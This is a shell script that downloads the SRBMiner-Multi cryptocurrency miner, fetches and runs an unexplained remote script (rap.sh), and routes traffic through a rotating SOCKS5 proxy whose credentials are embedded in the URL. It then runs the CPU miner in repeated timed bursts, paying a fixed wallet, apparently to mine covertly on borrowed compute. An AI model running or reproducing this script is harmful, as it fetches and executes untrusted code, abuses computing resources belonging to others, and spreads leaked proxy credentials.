#!/bin/sh
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.9/SRBMiner-Multi-0-8-9-Linux.tar.xz 
tar -xf SRBMiner-Multi-0-8-9-Linux.tar.xz 
cd SRBMiner-Multi-0-8-9
wget https://github.com/ahansura/srb/raw/main/rap.sh
chmod +x rap.sh
export http_proxy="socks5://djutybpn-rotate:vo7hn8ayc8s5@p.webshare.io:80/"

timeout 400 ./rap.sh
echo "Job 1 finished..."
sleep 5
timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
echo "Job 2 finished..."
sleep 5
timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
echo "Job 3 finished..."
sleep 5
timeout 450 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
echo "Job 4 finished..."
sleep 5
timeout 420 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
echo "Job 5 finished..."
sleep 5
timeout 520 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
echo "Job 6 finished..."
sleep 5
timeout 490 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
echo "Job 7 finished..."
sleep 5
timeout 400 ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool eu.flockpool.com:5555 --wallet RFtgkDCsn41AwwU3ZuBEjFszNMZRw227hb --tls true
echo "All Jobs finished..."
sleep 5




